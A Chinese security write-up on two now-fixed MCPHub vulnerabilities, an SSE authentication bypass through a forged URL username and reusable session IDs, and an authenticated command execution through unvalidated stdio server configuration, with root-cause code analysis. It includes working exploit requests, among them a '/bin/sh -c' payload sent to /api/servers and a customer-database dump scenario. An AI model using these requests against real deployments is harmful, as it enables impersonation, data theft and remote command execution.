#  MCPHub 高危漏洞实录：零凭证访问与授权后命令执行  
 蚁景网安   2026-11-24 09:38  
  
   
  
> 本文涉及的所有漏洞均已在新版本中修复，仅供安全研究与学习参考。  
  
  
看到标题，可能会误以为这是一条完整的攻击链——先绕过认证，再执行命令。但实际上两个漏洞没有任何依赖关系，放在一篇文章里面只是因为它们出自同一个项目。  
## MCPHub 是什么  
  
MCPHub 是一个 MCP 服务器的统一管理中间层。  
  
它解决的问题是：你本地或服务器上可能跑了一堆 MCP 服务，文件系统访问、数据库查询、网络请求……各有各的配置。MCPHub 把它们全部汇聚到一个统一的 SSE 端点，AI 客户端只连一个地址就能调用所有工具。  
  
环境搭建  
```
docker run -p 3000:3000 samanhappy/mcphub
```  
## 身份认证绕过漏洞  
  
攻击者不需要账号、不需要密码、不需要任何 token，只要把 URL 里的用户名改成想冒充的人，就能获得那个用户的完整权限——调用他配置的所有 MCP 工具，包括查数据库、读文件、调 API。  
  
这个漏洞跟后面讲的命令执行漏洞没有任何关系。它走的是 SSE 长连接这条路，完全绕开了登录流程，不需要 token，也不会触发任何命令执行。  
  
终端一中执行：  
```
 curl -N "http://127.0.0.1:3000/admin/sse/test"
```  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkj0WIicTHCBBAzOarFDEQb1BrlyzFIlfXqqwxu903h3Jvc7OE2kU90oEmfeTDq197YySiaOEW8OB0OQQaFllhNbsiaV3sia5jxVHxI/640?wx_fmt=png&from=appmsg "null")  
  
终端二中执行：  
```
Invoke-WebRequest -Uri "http://127.0.0.1:3000/admin/messages?sessionId=b4c0771b-decc-4b0f-ab0a-52f0612b2191" `   -Method POST `   -ContentType "application/json" `   -Body '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
```  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkiaZIbyLD5r2fM0rNwXz3yHzQ9hf6nb9aaibZn9OTF8TtmbOTIQLfEFnalBXR7FdovKib9Pxic9zKCRMibiaYribmJDVqibpMStLJcDxrA/640?wx_fmt=png&from=appmsg "null")  
  
终端一中接收到请求  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkgQM4bjx0z2avnAiczaQNkjByFW9RiaaKydicU1kleGnqIYR5zMB8iaRQqMAv4ntHZjLxST8TFY8icpvFYtAHysfNny5xOKM8ma2laI/640?wx_fmt=png&from=appmsg "null")  
  
admin 配置的工具全部列出来了。接下来就可以直接调用  
  
SSE (Server-Sent Events) 是一种服务器推送技术，允许服务器通过 HTTP 连接持续向客户端推送数据。与传统的请求-响应模式不同，SSE 连接在建立后会保持打开状态，服务器可以随时向客户端发送事件。  
  
MCPHub 的 SSE 接入路由格式是：  
```
GET /{username}/sse/{group}
```  
  
mcphub-main/src/middlewares/userContext.ts  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkiagwEEicpJcbvYekdnTmvzcpSRn0J5lyDpNJWYSj1Fr7XSEvh3QDoDqGq6RcFDdfnCR4z0AuD9ibH827aLmVLKvsmNGe3MsYNd5Y/640?wx_fmt=png&from=appmsg "null")  
  
从 URL 获取用户名，直接创建用户对象，无任何验证  
  
漏洞根本原因是：  
- • 直接信任 URL 参数：系统从 req.params.user 提取用户名，这个值完全由攻击者控制  
  
- • 缺少身份验证：没有检查当前请求是否已认证，没有验证 token、session 或任何凭证  
  
- • 缺少权限验证：没有检查请求者是否有权访问目标用户的资源  
  
- • 直接设置用户上下文：调用 setCurrentUser() 后，系统完全信任这个伪造的身份  
  
sseService.ts 是 MCPHub 的核心传输层服务文件，负责处理客户端与 MCP 服务器之间的所有通信。这个文件包含了 SSE (Server-Sent Events) 连接管理、会话管理、Bearer 认证验证等关键功能。身份验证绕过漏洞正是在这些核心功能中被利用的。  
  
mcphub-main/src/services/sseService.ts  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkhskfiaVib6oaT3BQLuJC6hJtqo5nOYnA8ibyBWOjdtn9MKzbCCjljnO1IDdCEJq64sk6e4YCYER3uDw6PfeH2OA23cfeWnrvEia7w/640?wx_fmt=png&from=appmsg "null")  
  
缺少 userId 字段 ，无法验证 session 所有权，任何人只要有 sessionId 就能使用  
  
因为 session 不记录它属于谁，handleSseMessage 处理消息时只判断"这个 sessionId 存不存在"，不管"这个 session 是不是你的"。拿到别人的 sessionId 就能直接用。  
  
mcphub-main/src/services/sseService.ts  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkiaQbeyEGFLOvcp5rRMBxIdwiafy48ibvXvRjCmBzO0DCuYn6ksxb5Y49ZujuQhNbKc4kXxQ2m936tjfRTZnicnjRTibr2yqwG3t2lg/640?wx_fmt=png&from=appmsg "null")  
  
validateBearerAuth 函数存在严重的认证绕过漏洞。当系统没有配置任何 Bearer keys 时（enabledKeys.length === 0，这是默认情况），该函数会直接返回 { valid: true } 允许所有请求通过，完全跳过身份验证。这意味着在大多数未配置 Bearer 认证的 MCPHub 部署环境中，任何人都可以不需要任何凭证就能访问系统。更糟糕的是，即使提供了无效的 Bearer token，只要系统未配置 keys，函数仍然返回认证成功，使得整个认证层形同虚设。  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkhPr6MxZvgK8lnibQUJnHS22sq4mqTZ6dgOznY9GZJmZy6qScposMBAEgCWIwpPrOSwB52xdxRLSLYB6UXlicmW7rqetkYElHDSM/640?wx_fmt=png&from=appmsg "null")  
  
handleSseConnection 函数直接信任并使用了中间件从 URL 参数中提取的用户名，没有验证请求者是否真的是该用户。攻击者只需在 URL 中指定任意用户名（如 /admin/sse/test），中间件就会将 'admin' 设置为当前用户上下文，然后 handleSseConnection 使用这个伪造的用户名构造消息路径 /admin/messages 并创建属于该用户的 SSE transport。整个过程中没有检查 URL 中的用户名是否与实际认证的用户匹配，导致攻击者可以伪装成任意用户获取其完整权限。  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkia5XiajcbgkdC5H2Due7VuuiaG4QWJLdnXLAvLpplTCicO9icWibldEKWOTaTudnwibPkEoBIWpibGg5icDaamy7LDZWLra9AUwW5HPwrY/640?wx_fmt=png&from=appmsg "null")  
  
handleSseMessage 函数在处理消息时只验证 sessionId 是否存在于全局 transports 对象中，但不验证该 session 是否属于当前请求的用户。由于 SessionContext 接口缺少 userId 字段，系统无法追踪每个 session 的所有者。这导致攻击者只要知道任何有效的 sessionId，就可以通过构造请求 POST /admin/messages?sessionId=xxx 来使用该 session 执行操作，即使这个 session 实际上属于其他用户。配合前两个漏洞，攻击者可以先伪装成 admin 获取 sessionId，然后持续使用该 sessionId 执行 admin 的所有操作。  
  
**步骤 1：客户端建立 SSE 连接**  
  
客户端向服务器发送 GET 请求，请求头包含 Accept: text/event-stream  
```
GET /admin/sse/test HTTP/1.1Host: 127.0.0.1:3000Accept: text/event-streamConnection: keep-alive注意：Connection 必须是 keep-alive 或不设置，如果设置为 close 会导致连接立即断开！
```  
  
**步骤 2：服务器返回 sessionId 并保持连接**  
  
服务器返回 200 OK，Content-Type: text/event-stream，并通过事件流推送 sessionId  
```
HTTP/1.1 200 OKContent-Type: text/event-streamevent: endpointdata: /admin/messages?sessionId=5b242344-ddf1-4c21-b8f4-0193d3467f1e
```  
  
关键点：此时 SSE 连接并未关闭，而是保持打开状态，等待后续事件推送。  
  
**步骤 3：使用 sessionId 发送消息**  
  
客户端使用获取到的 sessionId 发送 JSON-RPC 消息（通过另一个 HTTP POST 请求）  
```
POST /admin/messages?sessionId=5b242344-ddf1-4c21-b8f4-0193d3467f1e HTTP/1.1Host: 127.0.0.1:3000Content-Type: application/json{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
```  
  
**步骤 4：服务器通过 SSE 连接返回响应**  
```
event: messagedata: {"result":{"tools":[]},"jsonrpc":"2.0","id":2}
```  
  
漏洞危害  
  
假设 admin 用户配置了一个访问公司数据库的 MCP 工具：  
```
// 1. 伪装成 adminGET /admin/sse/company-db// 2. 列出工具POST /admin/messages?sessionId\=xxx{"method": "tools/list"}// 响应：{"tools": [    {      "name": "query_customer_data",      "description": "查询客户数据库"    }  ]}// 3. 执行工具窃取数据POST /admin/messages?sessionId=xxx{"method": "tools/call","params": {    "name": "query_customer_data",    "arguments": {      "query": "SELECT * FROM customers"    }  }}// 结果：获取所有客户信息
```  
  
validateBearerAuth  
 的逻辑已经改了。现在当 enableBearerAuth  
 为 true 且没有配置 key 时，不再直接放行，而是尝试验证 OAuth token，验证失败就拒绝：  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkhTghFRIrMeWem8BJQjkKwxYO3ptK3oXeKZDgNcCXJrdMVo5pD5lXnEEvgYsc7wJDNJax3VaBSODxzwb0sibku8xsHgmCyrVXKA/640?wx_fmt=png&from=appmsg "null")  
## 授权命令执行漏洞  
  
**必须先登录，必须有合法的 admin token**  
。/api/servers  
 接口用的是标准的 JWT 认证，不是 SSE 那套逻辑，漏洞一的 URL 用户名伪造对这个接口完全没用。  
  
漏洞一能冒充 admin，然后利用漏洞二执行命令？不行。因为冒充 admin 只是在 SSE 连接里设置了用户上下文，这个上下文不会转化成 JWT token，/api/servers  
 该要 token 还是要 token，两条路径互不相通。  
  
MCPHub 支持 stdio 类型的 MCP 服务器，本质是在本机启动一个子进程，用标准输入输出通信。问题在于添加服务器时，对 command  
 和 args  
 字段没有任何验证，你填 /bin/sh  
 加任意参数，服务器就会老实执行。  
  
构造数据包进行登录 获取 token 值  
```
POST /api/auth/login HTTP/1.1Host: 127.0.0.1:8000Content-Length: 42accept-language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36content-type: application/jsonAccept: */*Origin: http://localhost:3000Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://localhost:3000/loginAccept-Encoding: gzip, deflateCookie: i18next=enConnection: close{"username":"admin","password":"admin123"}
```  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkia1v1rGbdgFtlEBnO8vxdHgQt3jSSXPPhoicCZiaicKZnKtpWLWx94dZicbKDHoeTyvbGpPZm1RR5K0WefvJkJUX2S0HtvmicGwjhvU/640?wx_fmt=png&from=appmsg "null")  
  
利用登录后的 token 构造数据包  
```
POST /api/servers HTTP/1.1Host: 127.0.0.1:8000Content-Length: 105accept-language: enx-auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfSwiaWF0IjoxNzcwMzYxNTAzLCJleHAiOjE3NzA0NDc5MDN9.rTpSwQ8dKOrfYndjcVIe04kXaG8aKMN6kSvU1FPX_IMUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36content-type: application/jsonAccept: */*Origin: http://localhost:3000Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyReferer: http://localhost:3000/loginAccept-Encoding: gzip, deflateCookie: i18next=enConnection: close{"name":"rce_test","config":{"type":"stdio","command":"/bin/sh","args":["-c","whoami > /tmp/pwned.txt"]}}
```  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkia7KWiafboZ8AOyGTzibAwgFaIleib3FlLRaa3V2jmZibypibSlB34Je34vGlkCHicTfatnmxZz1vp4Gib2rqqqtBOmE3icBca1NUOdKAQ/640?wx_fmt=png&from=appmsg "null")  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkjHGRZSObiaOwIqEsm6UvBQZhIYxab2BXvBbdHr9KXiaQjvUibnFejUOVyzIL2ATSCm5wcZ4MY1iclhGeAKibIS6Q4S2ibcMXibgQARQ8/640?wx_fmt=png&from=appmsg "null")  
  
mcphub-main/src/controllers/serverController.ts  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkiaNgTh3c0wicasu22uia7FMibOwRHdymxg7AmxO082SBTYdX6MdNqyoA6g9tLgJ3ick8CLgkyzSCqOy06j7Y7E2HjOJP166HBAib81c/640?wx_fmt=png&from=appmsg "null")  
  
直接接受用户输入：直接从请求体中获取 config 对象，攻击者完全控制该对象的所有字段，包括 command、agrs 和 env。  
  
仅验证字段存在性：只检查 config.command 和 config.args 是否存在，不验证 command 是否在白名单中，不检查 args 是否包含危险字符串或者命令注入尝试，不限制可执行文件的路径。  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkhPsDuIh2VBricPOGcAGZgHT0f6OvZhfvW0JIwXuFMB9XNI3HwqFFLAUgH0U41s3XpyUSyrXXSmkib8svrae2CV13ZUeljibTq3Lo/640?wx_fmt=png&from=appmsg "null")  
  
类型验证不足：允许 stdio 类型，但没有对其进行任何特殊的安全检查，例如命令白名单或参数过滤。  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkglfe3x3dL9sJeGp0icQ2Ygf3eTdyTsL0Ax8ibm7aRbv4ndY9PuJowHEo7OnKIWsIwGYo8H6D2QoUrNx5mr5wX01f6FbdgJumJcE/640?wx_fmt=png&from=appmsg "null")  
  
未经过滤直接传递：未经过滤的恶意配置直接传递到服务层  
  
mcphub-main/src/services/mcpService.ts  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkjCkC1MpdicQB2VmMyII4ibOpia898hBp0j05ziaqsep4XZicpicmuZA8Q1Fyib8U1ZEdic5N6Q9eBU6an2WB1rS344Hvu2icJYeDnTt1yE/640?wx_fmt=png&from=appmsg "null")  
  
直接保存到数据库，没有任何安全检查：直接将未验证的 config 保存到数据库，没有任何命令或参数的安全检查，没有调用任何验证函数  
  
![image](https://mmbiz.qpic.cn/mmbiz_png/mwFvjeHDLkg5P4hrC3Y202A9FqTwH2G7OkGXGxRWdlpGwyUGcs6ZsWyobibPje62Q6Ypvxszc66EmtYRSXiboiayuFqE6PbglZO8Dp79XFoRE8/640?wx_fmt=png&from=appmsg "null")  
  
命令字段无验证：conf.command 可以是任意可执行文件路径，如 /bin/sh、/bin/bash、curl 等  
  
参数字段无过滤：conf.args 可以包含任意参数，包括 shell 元字符和命令注入载荷  
  
StdioClientTransport 直接创建子进程：底层使用 Node.js 的child_process.spawn()，直接执行攻击者控制的命令  
  
mcphub-main/src/services/mcpService.ts  
  
![image](https://mmbiz.qpic.cn/sz_mmbiz_png/mwFvjeHDLkiaNo9SOmcvzCpoa8q0gYTWnibVza5rJ8Al34IWEfcFcAVONRKibANpf6eficngNX8ymJBxJ8wxM6xyziaXqdm4wXB0tb1MbwWqQiaxo/640?wx_fmt=png&from=appmsg "null")  
  
一旦恶意服务器配置被保存到数据库，系统会自动调用 createTransportFromConfig 创建传输、在创建 StdioClientTransport 时启动子进程、攻击者的恶意命令被自动执行。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10 "")  
  
学  
习  
网安实战技术  
，戳  
“阅读原文”  
  
   
  
